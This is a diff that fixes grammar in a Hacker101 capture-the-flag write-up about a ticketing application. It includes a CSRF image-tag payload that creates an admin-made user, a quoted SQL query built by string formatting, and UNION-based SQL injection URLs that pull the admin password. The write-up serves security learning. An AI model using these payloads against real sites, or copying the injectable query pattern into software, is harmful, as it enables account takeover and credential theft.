@@ -22,7 +22,7 @@ tags: Hacker101
 </form>
 ```
 
-If both instances run on the same code then in live instance also is missing csrf token. So it should be possible trick browswer to send request to newUser endpoint. If currently loggen user will has admin priviliges then new user will be created. To achive thath, create ticket with this title and body:
+If both instances run on the same code then the live instance also is missing csrf token. So it should be possible to trick browsers to send requests to the newUser endpoint. If a currently logged user will have admin privileges then a new user will be created. To achieve that, create ticket with this title and body:
 
 ```html
 <img src="http://localhost/newUser?username=1test1&password=test&password2=test">
@@ -43,7 +43,7 @@ More about this vulnerability you can read [here](https://owasp.org/www-communit
 * The login form reveals more than it should
 * So does the ticket endpoint
 
-Tickets have id number, by manipulating that param is possible to exploit SQL injection because system respond with an error message to query where id has additional apostrophe. Original query to database:
+Tickets have an id number, by manipulating that param is possible to exploit SQL injection because the system responds with an error message to query where id has additional apostrophe. Original query to database:
 
 ![Error message](assets/live_instance/flag1/sql_error.png)
 
@@ -51,7 +51,7 @@ Tickets have id number, by manipulating that param is possible to exploit SQL in
 cur.execute('SELECT title, body, reply FROM tickets WHERE id=%s' % request.args['id'])
 ```
 
-So there must be way to exploit this vulnerability. As first step I try to control data presented on the page. With following query it is possible:
+So there must be a way to exploit this vulnerability. As the first step I try to control data presented on the page. With following query it is possible:
 
 ```
 http://34.74.105.127/74d469a935/ticket?id=111%20union%20select%20%271%27,%271%27,%271%27%20#
@@ -63,10 +63,10 @@ After reading hints I guess the second flag is somewhere in users table, probabl
 
 ![Flag](assets/live_instance/flag1/flag.png)
 
-and I was right, flag is admin passwod. 
+and I was right, the flag is admin password. 
 
 ```
 http://34.74.105.127/74d469a935/ticket?id=111%20union%20select%20username,password,%271%27%20from%20users%20where%20username=%27admin%27;select%20%271
 ```
 
-That query used to read flag. 
+That query used to read the flag. 
